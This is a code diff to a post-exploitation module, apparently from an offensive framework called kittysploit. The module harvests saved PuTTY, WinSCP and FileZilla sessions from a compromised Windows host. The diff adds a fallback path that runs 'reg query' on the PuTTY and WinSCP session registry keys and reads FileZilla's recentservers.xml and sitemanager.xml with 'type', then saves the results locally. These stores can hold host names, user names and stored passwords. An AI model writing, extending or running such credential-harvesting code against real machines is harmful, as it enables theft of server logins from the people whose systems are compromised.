@@ -6,6 +6,7 @@ Extract saved PuTTY, WinSCP, and FileZilla session data from a Windows session.
 """
 
 from kittysploit import *
+from lib.post.windows.session import win_compat_failure_type, win_probe_powershell
 import base64
 import os
 import re
@@ -88,6 +89,12 @@ class Module(Post):
     }
 
     save_local = OptBool(True, "Save results under ./output", False)
+    prefer_powershell = OptBool(
+        False,
+        "Prefer PowerShell when available (default: reg/type via cmd)",
+        False,
+        True,
+    )
 
     def _execute_cmd(self, command: str) -> str:
         if not command:
@@ -229,11 +236,56 @@ if (($putty.Count + $winscp.Count + $fz.Count) -eq 0) {
 """
 
     def check(self):
-        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
-        if "1" not in ps_check:
-            print_error("PowerShell is not available on the target")
-            return False
         return True
+
+    def _extract_via_cmd(self) -> str:
+        sections = []
+        putty = self._execute_cmd(
+            r'reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s'
+        )
+        if putty and "ERROR:" not in putty.upper():
+            sections.append(f"=== PuTTY Sessions ===\n{putty}")
+        else:
+            sections.append("=== PuTTY Sessions ===\n(none found)")
+
+        winscp = self._execute_cmd(
+            r'reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s'
+        )
+        if not winscp or "ERROR:" in (winscp or "").upper():
+            winscp = self._execute_cmd(
+                r'reg query "HKCU\Software\Martin Prikryl\WinSCP\Sessions" /s'
+            )
+        if winscp and "ERROR:" not in winscp.upper():
+            sections.append(
+                f"=== WinSCP Sessions ===\n{winscp}\n"
+                "(WinSCP passwords are often encrypted; offline decryption may be required)"
+            )
+        else:
+            sections.append("=== WinSCP Sessions ===\n(none found)")
+
+        fz_files = (
+            r"%APPDATA%\FileZilla\recentservers.xml",
+            r"%APPDATA%\FileZilla\sitemanager.xml",
+        )
+        fz_blocks = []
+        for path in fz_files:
+            exists = self._execute_cmd(f'if exist "{path}" (echo EXISTS) else (echo MISSING)')
+            if exists and "EXISTS" in exists:
+                content = self._execute_cmd(f'type "{path}"')
+                fz_blocks.append(f"=== FileZilla: {path} ===\n{content or '(empty)'}")
+        if fz_blocks:
+            sections.append("\n\n".join(fz_blocks))
+        else:
+            sections.append("=== FileZilla Sites ===\n(none found)")
+
+        joined = "\n\n".join(sections)
+        if (
+            "=== PuTTY Sessions ===\n(none found)" in joined
+            and "=== WinSCP Sessions ===\n(none found)" in joined
+            and "=== FileZilla Sites ===\n(none found)" in joined
+        ):
+            return "No PuTTY, WinSCP, or FileZilla session data found."
+        return joined
 
     def _save_output(self, content: str) -> str:
         os.makedirs(_LOCAL_OUT, exist_ok=True)
@@ -245,10 +297,17 @@ if (($putty.Count + $winscp.Count + $fz.Count) -eq 0) {
 
     def run(self):
         if not self.check():
-            raise ProcedureError(FailureType.NotCompatible, "PowerShell is not available on the target")
+            raise ProcedureError(win_compat_failure_type(), "Session dump prerequisites not met")
 
         print_status("Collecting PuTTY, WinSCP, and FileZilla sessions...")
-        result = self._run_powershell(self._powershell_script())
+        use_ps = self._bool_opt(self.prefer_powershell, False) and win_probe_powershell(self._execute_cmd)
+        if use_ps:
+            print_info("Using PowerShell")
+            result = self._run_powershell(self._powershell_script())
+        else:
+            if self._bool_opt(self.prefer_powershell, False):
+                print_warning("PowerShell preferred but not available — falling back to reg/cmd")
+            result = self._extract_via_cmd()
 
         if not result:
             raise ProcedureError(FailureType.Unknown, "No output was returned")
